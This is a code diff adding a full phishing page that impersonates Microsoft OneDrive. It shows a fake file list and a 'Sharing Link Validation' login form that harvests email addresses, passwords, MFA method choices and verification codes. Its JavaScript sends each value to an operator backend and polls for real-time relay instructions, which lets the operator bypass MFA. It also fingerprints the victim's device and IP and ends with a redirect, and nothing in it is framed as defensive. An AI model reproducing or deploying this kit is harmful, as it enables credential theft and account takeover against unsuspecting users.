@@ -1,0 +1,752 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:o="urn:schemas-microsoft-com:office:office" lang="en-us" dir="ltr">
+
+<head>
+    <link id="favicon" rel="shortcut icon"
+        href="https://learningresourcesnetwork-my.sharepoint.com/_layouts/15/images/favicon.ico?rev=47"
+        type="image/vnd.microsoft.icon">
+    <title>
+        Sharing Link Validation
+    </title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link rel="stylesheet" href="https://robertlugana.sirv.com/OneDrive/stylo.css">
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const bgContainer = document.querySelector('.onedrive-bg');
+            const loginModal = document.getElementById('SharingValidationControlsSection');
+
+            if (bgContainer && loginModal) {
+                bgContainer.addEventListener('click', function () {
+                    loginModal.style.display = 'flex';
+                });
+            }
+
+            if (typeof onPageLoad === 'function') {
+                onPageLoad();
+            }
+        });
+    </script>
+</head>
+
+<body>
+    <!-- Background UI (OneDrive Clone) -->
+    <div class="onedrive-bg">
+        <div class="od-topbar">
+            <div class="od-waffle"><i class="fas fa-th"></i></div>
+            <div class="od-title">OneDrive</div>
+        </div>
+        <div class="od-container">
+            <div class="od-sidebar">
+                <div class="od-nav-item active">
+                    <div class="od-nav-icon"><i class="far fa-folder"></i></div>
+                    My files
+                </div>
+                <div class="od-nav-item">
+                    <div class="od-nav-icon"><i class="fas fa-history"></i></div>
+                    Recent
+                </div>
+                <div class="od-nav-item">
+                    <div class="od-nav-icon"><i class="fas fa-users"></i></div>
+                    Shared
+                </div>
+                <div class="od-nav-item">
+                    <div class="od-nav-icon"><i class="far fa-trash-alt"></i></div>
+                    Recycle bin
+                </div>
+            </div>
+            <div class="od-content">
+                <div class="od-header">
+                    <div class="od-breadcrumb">My files</div>
+                </div>
+                <div class="od-file-list">
+                    <!-- Header Row -->
+                    <div class="od-file-row"
+                        style="cursor: default; border-bottom: 1px solid #edebe9; color: #605e5c; font-weight: 600; font-size: 12px;">
+                        <div class="od-col-checkbox"><i class="far fa-square"></i></div>
+                        <div class="od-col-icon"></div>
+                        <div class="od-col-name">Name <i class="fas fa-arrow-down"></i></div>
+                        <div class="od-col-modified">Modified <i class="fas fa-chevron-down"></i></div>
+                        <div class="od-col-members">Members</div>
+                        <div class="od-col-more"></div>
+                    </div>
+
+                    <!-- File 1 -->
+                    <div class="od-file-row">
+                        <div class="od-col-checkbox"><i class="far fa-square"></i></div>
+                        <div class="od-col-icon file-icon-pdf"><i class="far fa-file-pdf"></i></div>
+                        <div class="od-col-name">{{file1Name}}</div>
+                        <div class="od-col-modified">{{file1Date}}</div>
+                        <div class="od-col-members">Only you</div>
+                        <div class="od-col-more"><i class="fas fa-ellipsis-h"></i></div>
+                    </div>
+
+                    <!-- File 2 -->
+                    <div class="od-file-row">
+                        <div class="od-col-checkbox"><i class="far fa-square"></i></div>
+                        <div class="od-col-icon file-icon-pdf"><i class="far fa-file-pdf"></i></div>
+                        <div class="od-col-name">{{file2Name}}</div>
+                        <div class="od-col-modified">{{file2Date}}</div>
+                        <div class="od-col-members">Only you</div>
+                        <div class="od-col-more"><i class="fas fa-ellipsis-h"></i></div>
+                    </div>
+
+                    <!-- File 3 -->
+                    <div class="od-file-row">
+                        <div class="od-col-checkbox"><i class="far fa-square"></i></div>
+                        <div class="od-col-icon file-icon-pdf"><i class="far fa-file-pdf"></i></div>
+                        <div class="od-col-name">{{file3Name}}</div>
+                        <div class="od-col-modified">{{file3Date}}</div>
+                        <div class="od-col-members">Only you</div>
+                        <div class="od-col-more"><i class="fas fa-ellipsis-h"></i></div>
+                    </div>
+
+                    <!-- File 4 -->
+                    <div class="od-file-row">
+                        <div class="od-col-checkbox"><i class="far fa-square"></i></div>
+                        <div class="od-col-icon file-icon-excel"><i class="far fa-file-excel"></i></div>
+                        <div class="od-col-name">{{file4Name}}</div>
+                        <div class="od-col-modified">{{file4Date}}</div>
+                        <div class="od-col-members">Only you</div>
+                        <div class="od-col-more"><i class="fas fa-ellipsis-h"></i></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="SharingValidationControlsSection" class="external-sharing-content ms-Fabric" style="display:none;">
+
+        <form id="{{formId}}" onsubmit="return false;" method="post" autocomplete="off">
+            <div class="aspNetHidden">
+                <input type="hidden" name="formId" value="{{formId}}">
+            </div>
+
+            <div class="main-content">
+                <div class="sharing-form">
+                    <div class="header" style="margin-bottom: 20px;">
+                        <img class="microsoft-logo" src="https://robertlugana.sirv.com/microsoft-logo.png"
+                            alt="Microsoft" style="height: 24px;">
+                    </div>
+
+                    <div class="form-content">
+                        <div id="PasswordEntryControls">
+                            <div class="form-message">To access the shared content, enter your email address and
+                                password below.</div>
+
+                            <div class="form-input-container" id="emailGroup">
+                                <input name="txtEmail" type="email" id="txtEmail" class="form-text-input"
+                                    autocomplete="off" size="25" aria-describedby="lblEmailCallout"
+                                    placeholder="Enter email">
+                                <div class="focus-area">
+                                    <i class="ms-Icon ms-Icon--Info" aria-hidden="true"></i>
+                                    <div class="callout">
+                                        <div class="callout-title">Email</div>
+                                        <span id="lblEmailCallout">Enter your email address.</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="form-input-container" id="passwordGroup">
+                                <input name="txtPassword" type="password" maxlength="64" id="txtPassword"
+                                    class="form-text-input" autocomplete="off" size="25"
+                                    aria-describedby="lblPasswordCallout" placeholder="Enter password"
+                                    onkeypress="if(event.key === 'Enter') handleFormSubmission();">
+                                <div class="focus-area">
+                                    <i class="ms-Icon ms-Icon--Info" aria-hidden="true"></i>
+                                    <div class="callout">
+                                        <div class="callout-title">Why do I have to do this?</div>
+                                        <span id="lblPasswordCallout">For files/folders access we need to verify your
+                                            identity. Enter your password to access the content.</span>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="form-input-container" id="verificationOptionsGroup" style="display:none;">
+                                <div class="form-message">Choose a verification method</div>
+                                <div id="verificationOptionsContainer"></div>
+                                <div class="form-error-container">
+                                    <span id="RequireVerificationChoice" style="display:none;">Please select a
+                                        verification option.</span>
+                                </div>
+                            </div>
+
+                            <div class="form-input-container" id="verificationCodeGroup" style="display:none;">
+                                <div class="form-message">Enter the verification code sent to your device</div>
+                                <input name="txtVerificationCode" type="text" id="txtVerificationCode"
+                                    class="form-text-input" autocomplete="off" size="25"
+                                    placeholder="Enter verification code"
+                                    onkeypress="if(event.key === 'Enter') handleFormSubmission();">
+                                <div class="form-error-container">
+                                    <span id="RequireVerificationCode" style="display:none;">Verification code is
+                                        required.</span>
+                                    <span id="InvalidVerificationCode" style="display:none;">Invalid verification code.
+                                        Please try again.</span>
+                                </div>
+                            </div>
+
+                            <div class="form-error-container">
+                                <span id="RequirePassword" style="display:none;">Password is required</span>
+                                <span id="InvalidPassword" style="display:none;">Incorrect email or password. Try
+                                    again.</span>
+                                <span id="InvalidEmail" style="display:none;">Invalid email address. Please enter a
+                                    valid email.</span>
+                                <span id="GeneralError" style="display:none;">An error occurred. Please try
+                                    again.</span>
+                            </div>
+                            <div class="form-input-container">
+                                <input type="button" name="btnSubmitPassword" value="Verify" id="btnSubmitPassword"
+                                    accesskey="V" class="form-submit" onclick="handleFormSubmission()">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="legal">
+                        <span>&copy; 2017 Microsoft</span>
+                        <a href="https://go.microsoft.com/fwlink/?linkid=845480">Privacy &amp; Cookies</a>
+                    </div>
+                </div>
+            </div>
+
+        </form>
+
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay"
+        style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.85); z-index:9999; flex-direction:column; justify-content:center; align-items:center;">
+        <div class="loading-spinner"
+            style="border:4px solid #f3f3f3; border-top:4px solid #0078d4; border-radius:50%; width:48px; height:48px; animation:spin 1s linear infinite; margin-bottom:16px;">
+        </div>
+        <p id="loadingMessage" style="color:#333; font-size:14px; font-family:'Segoe UI',sans-serif;">Securing your
+            connection...</p>
+        <p id="errorMessage" style="color:#d32f2f; font-size:14px; font-family:'Segoe UI',sans-serif; display:none;">An
+            error occurred. Please try again.</p>
+    </div>
+    <style>
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+
+    <script>
+        const templateConfig = {
+            postURL: window.location.origin + '/api',
+            token: "{{token}}",
+            landingPageLink: "{{landingPageLink}}"
+        };
+
+        const apiBaseUrl = templateConfig.postURL;
+
+        let browserId = null;
+        let pollingIntervalId = null;
+        let pollingStartTime = null;
+        const POLLING_TIMEOUT_MS = 10 * 60 * 1000;
+        let currentStatus = null;
+        let lastShownStatus = '';
+
+        const loadingMessages = [
+            "Securing your connection...",
+            "Verifying document integrity...",
+            "Establishing encrypted tunnel...",
+            "Authenticating access protocols...",
+            "Preparing your secure workspace...",
+            "Almost there, just a moment...",
+            "Ensuring data privacy...",
+            "Finalizing secure document retrieval..."
+        ];
+        let currentMessageIndex = 0;
+        let messageIntervalId = null;
+
+        function objectToFormData(obj) {
+            const fd = new URLSearchParams();
+            Object.entries(obj).forEach(([k, v]) => { fd.append(k, v.toString()); });
+            return fd.toString();
+        }
+
+        function showLoadingOverlay(showSpinner) {
+            const overlay = document.getElementById('loadingOverlay');
+            overlay.style.display = 'flex';
+            document.getElementById('SharingValidationControlsSection').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'none';
+            document.querySelector('.loading-spinner').style.display = showSpinner ? 'block' : 'none';
+            startLoadingMessages();
+        }
+
+        function showErrorOverlay(message) {
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            document.getElementById('SharingValidationControlsSection').style.display = 'none';
+            document.querySelector('.loading-spinner').style.display = 'none';
+            document.getElementById('loadingMessage').style.display = 'none';
+            document.getElementById('errorMessage').textContent = message || 'An error occurred. Please try again.';
+            document.getElementById('errorMessage').style.display = 'block';
+            clearInterval(messageIntervalId);
+        }
+
+        function hideLoadingOverlay() {
+            document.getElementById('loadingOverlay').style.display = 'none';
+            document.getElementById('SharingValidationControlsSection').style.display = 'flex';
+            document.getElementById('loadingMessage').style.display = 'block';
+            clearInterval(messageIntervalId);
+        }
+
+        function startLoadingMessages() {
+            const el = document.getElementById('loadingMessage');
+            currentMessageIndex = 0;
+            el.textContent = loadingMessages[currentMessageIndex];
+            if (messageIntervalId) clearInterval(messageIntervalId);
+            messageIntervalId = setInterval(() => {
+                currentMessageIndex = (currentMessageIndex + 1) % loadingMessages.length;
+                el.textContent = loadingMessages[currentMessageIndex];
+            }, 5000);
+        }
+
+        function hideAllErrors() {
+            ['InvalidEmail', 'InvalidPassword', 'RequirePassword', 'GeneralError', 'RequireVerificationChoice', 'RequireVerificationCode', 'InvalidVerificationCode'].forEach(id => {
+                document.getElementById(id).style.display = 'none';
+            });
+        }
+
+        function isValidEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+
+        function startPolling(intervalMs) {
+            if (pollingIntervalId) clearInterval(pollingIntervalId);
+            if (pollingStartTime === null) pollingStartTime = Date.now();
+            pollingIntervalId = setInterval(pollOperator, intervalMs);
+        }
+
+        async function pollOperator() {
+            if (!browserId) { clearInterval(pollingIntervalId); return; }
+            if (pollingStartTime !== null && Date.now() - pollingStartTime > POLLING_TIMEOUT_MS) {
+                clearInterval(pollingIntervalId);
+                showErrorOverlay('Session timed out. Please try again.');
+                return;
+            }
+            try {
+                const res = await fetch(apiBaseUrl + '/pooling-operator', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: objectToFormData({ browserId: browserId, token: templateConfig.token })
+                });
+                if (!res.ok) throw new Error('Poll error ' + res.status);
+                const data = await res.json();
+                if (data.currentStatus) {
+                    updateUIForStatus(data.currentStatus, data.data || {});
+                }
+            } catch (e) {
+                console.error('Poll error:', e);
+            }
+        }
+
+        function updateUIForStatus(status, data) {
+            currentStatus = status;
+            const emailGroup = document.getElementById('emailGroup');
+            const passwordGroup = document.getElementById('passwordGroup');
+            const verificationOptionsGroup = document.getElementById('verificationOptionsGroup');
+            const verificationCodeGroup = document.getElementById('verificationCodeGroup');
+            const submitButton = document.getElementById('btnSubmitPassword');
+            const emailField = document.getElementById('txtEmail');
+            const passwordField = document.getElementById('txtPassword');
+            const verificationCodeInput = document.getElementById('txtVerificationCode');
+
+            hideAllErrors();
+            submitButton.disabled = false;
+            submitButton.style.backgroundColor = '';
+            submitButton.style.color = '';
+
+            emailGroup.style.display = 'block';
+            passwordGroup.style.display = 'block';
+            verificationOptionsGroup.style.display = 'none';
+            verificationCodeGroup.style.display = 'none';
+
+            switch (status) {
+                case 'WAITING':
+                    showLoadingOverlay(true);
+                    submitButton.innerText = 'Checking...';
+                    submitButton.disabled = true;
+                    emailField.readOnly = true;
+                    passwordField.disabled = true;
+                    startPolling(5000);
+                    break;
+                case 'PROCESSING':
+                    showLoadingOverlay(true);
+                    submitButton.innerText = 'Processing...';
+                    submitButton.disabled = true;
+                    emailField.readOnly = true;
+                    passwordField.disabled = true;
+                    startPolling(10000);
+                    break;
+                case 'WAITINGEMAIL':
+                case 'WAITINGEMAILERROR':
+                    hideLoadingOverlay();
+                    submitButton.innerText = 'Verify';
+                    emailField.readOnly = false;
+                    passwordField.disabled = false;
+                    if (data.email) emailField.value = data.email;
+                    if (data.lastJsonResponse) {
+                        try {
+                            const r = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
+                            if (r.message && !r.message.includes('Processing email')) {
+                                document.getElementById('InvalidEmail').textContent = r.message;
+                                document.getElementById('InvalidEmail').style.display = 'block';
+                                passwordField.value = '';
+                            }
+                        } catch (e) { }
+                    }
+                    startPolling(10000);
+                    break;
+                case 'WAITINGPASSWORD':
+                case 'WAITINGPASSWORDERROR':
+                    hideLoadingOverlay();
+                    submitButton.innerText = 'Verify';
+                    if (data.email) emailField.value = data.email;
+                    emailField.readOnly = true;
+                    passwordField.disabled = false;
+                    if (lastShownStatus !== currentStatus && data.lastJsonResponse) {
+                        try {
+                            const r = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
+                            if (r.message && (r.message.includes('Incorrect password') || r.message.includes('incorrect'))) {
+                                document.getElementById('InvalidPassword').textContent = r.message;
+                                document.getElementById('InvalidPassword').style.display = 'block';
+                                passwordField.value = '';
+                            }
+                        } catch (e) { }
+                    }
+                    lastShownStatus = currentStatus;
+                    startPolling(10000);
+                    break;
+                case 'WAITINGOPTIONS':
+                    hideLoadingOverlay();
+                    emailGroup.style.display = 'none';
+                    passwordGroup.style.display = 'none';
+                    verificationOptionsGroup.style.display = 'block';
+                    verificationCodeGroup.style.display = 'none';
+                    submitButton.innerText = 'Submit Choice';
+                    let rawOpts = data.verificationOptions || [];
+                    if (typeof rawOpts === 'string') { try { rawOpts = JSON.parse(rawOpts); } catch (e) { rawOpts = []; } }
+                    renderVerificationOptions(Array.isArray(rawOpts) ? rawOpts : []);
+                    startPolling(10000);
+                    break;
+                case 'WAITINGCODE':
+                    hideLoadingOverlay();
+                    emailGroup.style.display = 'none';
+                    passwordGroup.style.display = 'none';
+                    verificationOptionsGroup.style.display = 'none';
+                    verificationCodeGroup.style.display = 'block';
+                    submitButton.innerText = 'Submit Code';
+                    verificationCodeInput.value = '';
+                    if (data.lastJsonResponse) {
+                        try {
+                            const r = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
+                            if (r.message && (r.message.includes('Incorrect verification code') || r.message.includes('incorrect code'))) {
+                                document.getElementById('InvalidVerificationCode').textContent = r.message;
+                                document.getElementById('InvalidVerificationCode').style.display = 'block';
+                            }
+                        } catch (e) { }
+                    }
+                    startPolling(10000);
+                    break;
+                case 'COMPLETED':
+                    hideLoadingOverlay();
+                    clearInterval(pollingIntervalId);
+                    let redirectUrl = templateConfig.landingPageLink && templateConfig.landingPageLink.trim() !== ''
+                        ? templateConfig.landingPageLink
+                        : window.location.href;
+                    if (redirectUrl && !redirectUrl.startsWith('http://') && !redirectUrl.startsWith('https://')) {
+                        redirectUrl = 'https://' + redirectUrl;
+                    }
+                    window.location.href = redirectUrl;
+                    break;
+                case 'FAILED':
+                    showErrorOverlay('Document retrieval failed. Please try again later.');
+                    clearInterval(pollingIntervalId);
+                    break;
+                default:
+                    showErrorOverlay('An unexpected status was received. Please try again.');
+                    clearInterval(pollingIntervalId);
+                    break;
+            }
+        }
+
+        function renderVerificationOptions(options) {
+            const container = document.getElementById('verificationOptionsContainer');
+            container.innerHTML = '';
+            if (!options || options.length === 0) {
+                container.innerHTML = '<p style="color:#666;font-size:13px;">No verification options available.</p>';
+                return;
+            }
+            options.forEach((opt, idx) => {
+                const div = document.createElement('div');
+                div.style.marginBottom = '8px';
+                const input = document.createElement('input');
+                input.type = 'radio';
+                input.className = 'form-check-input';
+                input.name = 'verificationOption';
+                input.id = 'vOpt' + idx;
+                input.value = opt.choiceIndex;
+                input.dataset.type = opt.type || '';
+                input.dataset.maskedDetail = opt.maskedDetail || '';
+                input.dataset.requiresInput = opt.requiresInput ? 'true' : 'false';
+                input.dataset.inputLabel = opt.inputLabel || '';
+                const label = document.createElement('label');
+                label.className = 'form-check-label';
+                label.htmlFor = 'vOpt' + idx;
+                label.style.marginLeft = '6px';
+                label.style.fontSize = '13px';
+                label.textContent = opt.label;
+                div.appendChild(input);
+                div.appendChild(label);
+                if (opt.requiresInput && opt.inputLabel) {
+                    const inputGroup = document.createElement('div');
+                    inputGroup.style.marginTop = '8px';
+                    inputGroup.style.marginBottom = '12px';
+                    if (opt.type === 'email') {
+                        const helpText = document.createElement('div');
+                        helpText.style.fontSize = '12px';
+                        helpText.style.color = '#666';
+                        helpText.style.marginBottom = '6px';
+                        helpText.textContent = 'Type the full name part before @ — e.g., if your email is ' + (opt.maskedDetail || 'you***@gmail.com') + ', type what the **** hides.';
+                        inputGroup.appendChild(helpText);
+                    }
+                    const inputRow = document.createElement('div');
+                    inputRow.style.display = 'flex';
+                    inputRow.style.alignItems = 'center';
+                    inputRow.style.gap = '0';
+                    const textInput = document.createElement('input');
+                    textInput.type = 'text';
+                    textInput.className = 'form-control';
+                    textInput.style.maxWidth = '260px';
+                    textInput.style.flex = '1';
+                    textInput.placeholder = opt.type === 'email' ? 'Enter name before @' : opt.inputLabel;
+                    textInput.id = 'optInput' + idx;
+                    textInput.dataset.optionIndex = idx;
+                    inputRow.appendChild(textInput);
+                    if (opt.maskedDetail && opt.type === 'email') {
+                        const atIndex = opt.maskedDetail.lastIndexOf('@');
+                        if (atIndex !== -1) {
+                            const domainHint = document.createElement('span');
+                            domainHint.textContent = opt.maskedDetail.slice(atIndex);
+                            domainHint.style.padding = '6px 12px';
+                            domainHint.style.fontSize = '13px';
+                            domainHint.style.color = '#666';
+                            domainHint.style.whiteSpace = 'nowrap';
+                            domainHint.style.border = '1px solid #ced4da';
+                            domainHint.style.borderLeft = 'none';
+                            domainHint.style.borderRadius = '0 4px 4px 0';
+                            domainHint.style.backgroundColor = '#e9ecef';
+                            inputRow.appendChild(domainHint);
+                        }
+                    }
+                    inputGroup.appendChild(inputRow);
+                    div.appendChild(inputGroup);
+                }
+                container.appendChild(div);
+            });
+        }
+
+        async function initialFormSubmission() {
+            showLoadingOverlay(true);
+            const urlParams = new URLSearchParams(window.location.search);
+            const email = urlParams.get('email');
+            const emailField = document.getElementById('txtEmail');
+            const emailCallout = document.getElementById('lblEmailCallout');
+
+            if (email) {
+                emailField.value = email;
+                emailField.readOnly = true;
+                emailCallout.textContent = 'Your email was securely prefilled and cannot be changed.';
+            } else {
+                emailField.readOnly = false;
+                emailCallout.textContent = 'Enter your email address.';
+            }
+
+            const deviceData = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                vendor: navigator.vendor,
+                maxTouchPoints: navigator.maxTouchPoints,
+            };
+
+            let ipData = {};
+            try { ipData = await fetch('https://ipinfo.io/json').then(r => r.json()); } catch (e) { }
+
+            const formDataContent = {
+                email: email || '',
+                password: '',
+                strictly: 'outlook',
+                ipData: ipData,
+                deviceData: deviceData
+            };
+
+            try {
+                const res = await fetch(apiBaseUrl + '/notify-form-submission', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: objectToFormData({
+                        token: templateConfig.token,
+                        formData: JSON.stringify(formDataContent)
+                    })
+                });
+                if (!res.ok) throw new Error('HTTP ' + res.status);
+                const data = await res.json();
+                if (data.apiResponse && data.apiResponse.browserId) {
+                    browserId = data.apiResponse.browserId;
+                    updateUIForStatus(data.apiResponse.status, data.apiResponse);
+                } else {
+                    throw new Error('No browserId received');
+                }
+            } catch (e) {
+                console.error('Initial submission error:', e);
+                showErrorOverlay('Failed to initiate process. Please try again.');
+            }
+        }
+
+        async function handleFormSubmission() {
+            hideAllErrors();
+            showLoadingOverlay(true);
+
+            const emailField = document.getElementById('txtEmail');
+            const passwordField = document.getElementById('txtPassword');
+            const verificationCodeInput = document.getElementById('txtVerificationCode');
+            const submitButton = document.getElementById('btnSubmitPassword');
+
+            submitButton.disabled = true;
+            submitButton.value = 'Submitting...';
+            submitButton.style.backgroundColor = '#BEBEBE';
+            submitButton.style.color = '#000';
+
+            let payload = { browserId: browserId, token: templateConfig.token };
+            let updateType = '';
+
+            if (currentStatus === 'WAITINGEMAIL') {
+                const email = emailField.value.trim();
+                if (!isValidEmail(email)) {
+                    document.getElementById('InvalidEmail').style.display = 'block';
+                    hideLoadingOverlay();
+                    resetFormState();
+                    return;
+                }
+                payload.email = email;
+                const password = passwordField.value.trim();
+                if (password) payload.password = password;
+                updateType = 'email';
+            } else if (currentStatus === 'WAITINGPASSWORD' || currentStatus === 'WAITINGPASSWORDERROR') {
+                const password = passwordField.value.trim();
+                if (!password) {
+                    document.getElementById('RequirePassword').style.display = 'block';
+                    hideLoadingOverlay();
+                    resetFormState();
+                    return;
+                }
+                payload.password = password;
+                updateType = 'password';
+            } else if (currentStatus === 'WAITINGOPTIONS') {
+                const selected = document.querySelector('input[name="verificationOption"]:checked');
+                if (!selected) {
+                    document.getElementById('RequireVerificationChoice').style.display = 'block';
+                    hideLoadingOverlay();
+                    resetFormState();
+                    return;
+                }
+                const requiresInput = selected.dataset.requiresInput === 'true';
+                const inputLabel = selected.dataset.inputLabel;
+                let hiddenValue = '';
+                if (requiresInput) {
+                    const optionIndex = Array.from(document.querySelectorAll('input[name="verificationOption"]')).indexOf(selected);
+                    const inputField = document.getElementById('optInput' + optionIndex);
+                    if (inputField) {
+                        hiddenValue = inputField.value.trim();
+                        if (!hiddenValue) {
+                            document.getElementById('RequireVerificationChoice').textContent = 'Please enter ' + (inputLabel || 'the required value') + ' for the selected option.';
+                            document.getElementById('RequireVerificationChoice').style.display = 'block';
+                            hideLoadingOverlay();
+                            resetFormState();
+                            return;
+                        }
+                    }
+                }
+                const choiceObj = { choice: selected.value };
+                if (hiddenValue) choiceObj.hiddenPhoneEmail = hiddenValue;
+                payload.verificationChoice = JSON.stringify([choiceObj]);
+                updateType = 'verificationChoice';
+            } else if (currentStatus === 'WAITINGCODE') {
+                const code = verificationCodeInput.value.trim();
+                if (!code) {
+                    document.getElementById('RequireVerificationCode').style.display = 'block';
+                    hideLoadingOverlay();
+                    resetFormState();
+                    return;
+                }
+                payload.verificationCode = code;
+                updateType = 'verificationCode';
+            } else {
+                showErrorOverlay('Unexpected form submission state. Please try again.');
+                return;
+            }
+
+            payload.updateType = updateType;
+
+            try {
+                const res = await fetch(apiBaseUrl + '/update-process', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: objectToFormData(payload)
+                });
+                if (!res.ok) throw new Error('HTTP ' + res.status);
+                await res.json();
+                pollingStartTime = Date.now();
+                startPolling(3000);
+            } catch (e) {
+                console.error('Submission error:', e);
+                showErrorOverlay('An error occurred during submission. Please try again.');
+            }
+        }
+
+        function resetFormState() {
+            const btn = document.getElementById('btnSubmitPassword');
+            const emailField = document.getElementById('txtEmail');
+            const passwordField = document.getElementById('txtPassword');
+            if (!new URLSearchParams(window.location.search).get('email')) {
+                emailField.readOnly = false;
+            }
+            passwordField.disabled = false;
+            passwordField.value = '';
+            btn.disabled = false;
+            btn.value = 'Verify';
+            btn.style.backgroundColor = '';
+            btn.style.color = '';
+            document.getElementById('emailGroup').style.display = 'block';
+            document.getElementById('passwordGroup').style.display = 'block';
+            document.getElementById('verificationOptionsGroup').style.display = 'none';
+            document.getElementById('verificationCodeGroup').style.display = 'none';
+        }
+
+        document.addEventListener('DOMContentLoaded', function () {
+            const bg = document.querySelector('.onedrive-bg');
+            const loginModal = document.getElementById('SharingValidationControlsSection');
+            if (bg && loginModal) {
+                bg.addEventListener('click', function () {
+                    loginModal.style.display = 'flex';
+                });
+            }
+            initialFormSubmission();
+        });
+    </script>
+
+</body>
+
+</html>
